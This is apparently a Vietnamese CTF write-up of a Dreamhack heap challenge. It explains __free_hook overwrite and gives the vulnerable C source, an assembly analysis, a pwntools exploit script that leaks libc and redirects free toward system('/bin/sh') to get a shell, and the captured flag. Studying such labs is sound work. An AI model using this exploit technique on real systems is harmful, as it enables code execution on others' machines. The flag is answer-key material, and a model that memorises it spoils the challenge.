# Hook Overwrite

trước khi vào chall này thì chúng ta **cần tìm hiểu về Hook Overwrite trên dreamhack và JHT Pwner nha**

**dreamhack:** https://learn.dreamhack.io/11#17

theo như những gì mình hiểu thì:

## Hook

![image](https://github.com/gookoosss/CTF/assets/128712571/d677a5e5-35aa-4bb4-818f-0747c87eb8fa)



- trong các hàm **malloc, realloc, free** thì có các hàm hook tương ứng là **malloc_hook, __realloc_hook và __free_hook** 
- khi chạy vào **malloc, realloc, free,** nó sẽ kiểm tra xem các cái giá trị hook có phải là null không, nếu không phải thì chứ sẽ trỏ đến cái địa chỉ mà hook đang chứa
- Các hàm liên quan tới heap như malloc, realloc và free đều có những cái hook riêng. **Khi ta kiểm soát được các hook đó đồng nghĩa với việc ta hoàn toàn có thể cho chương trình thực thi các lệnh tùy ý mà ta mong muốn.**

### source C:

```c 
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}

```


waoo bài này có **hàm system("/bin/sh") ngay trong hàm main kìa** , nên h ta chỉ cần chạy hết chương trình là lấy shell thôi hehe


![image](https://github.com/gookoosss/CTF/assets/128712571/24c9ddda-66cf-4fd6-a2e0-daf585e70725)

ôi không ta bị **lỗi double free** rồi :(((

```
nghĩa là ta chỉ chạy qua được hàm free 1 lần thôi, nếu chạy qua lần nữa sẽ bị lỗi đó
```

**vậy thì ý tưởng của ta bây giờ là làm sao thực thi được shell khi đi qua free lần đầu** 

lúc này thì ta cần sử dụng `kĩ thuật Hook Overwrite` mà ta vừa học để khai thác

## Ý tưởng:

- chương trình cho ta địa chỉ stdout nên từ đây ta có thể **dễ dàng leak được libc base**
- có được địa chỉ libc base rồi nên ta có thể **sử dụng __free_hook để thực thi địa chỉ mình muốn**
- khi chạy vào hàm free lần đầu , **lợi dụng __free_hook để trỏ đến địa chỉ system để lấy shell, tránh được lỗi double free**

à ở đây có 1 vần đề ta cần lưu ý:

![image](https://github.com/gookoosss/CTF/assets/128712571/f726634a-fd51-4245-aba2-1a1723cb3e36)


phân tích đoạn mã ASM này thì ta thấy là đầu tiên chương trình sẽ gán giá trị ta nhập vào Data vào rax, sau đó lấy 8byte đầu gán vào rdx, tiếp theo lấy lại 8byte sau gán vào rax, cuối cùng thì gán rax vào địa chỉ là rdx đang trỏ đến

**=> ta phải gán cho rdx bằn 1 địa chỉ hợp lệ là 8byte đầu ta nhập vào Data**

vì vậy ta sẽ gán **8byte đầu là địa chỉ của __free_hook**

8byte tiếp theo sẽ là địa chỉ **0x0000000000400a11 nằm trước system**

![image](https://github.com/gookoosss/CTF/assets/128712571/63cfd7b7-4ae1-4aaf-8587-2aedda47f5a3)


## script:

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./hook_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
context.binary = exe
p = process([exe.path])
# p = remote("host3.dreamhack.games", 22503)



gdb.attach(p, gdbscript = '''
b*main+149
c
''')
           
input()

p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
log.info('libc leak :' + hex(libc_leak))
log.info('libc base :' + hex(libc.address))


p.sendlineafter(b'Size: ', b'512')
payload = flat(
    libc.sym['__free_hook'], # địa chỉ của __free_hook
    0x0000000000400a11
)
    
p.sendlineafter(b'Data: ', payload)

p.interactive()

```

## Flag:

**DH{c5e5c5c0a45d71d2666571ab2dc09cf4c4e750402ab4bb4c8a57091063ee7418}**


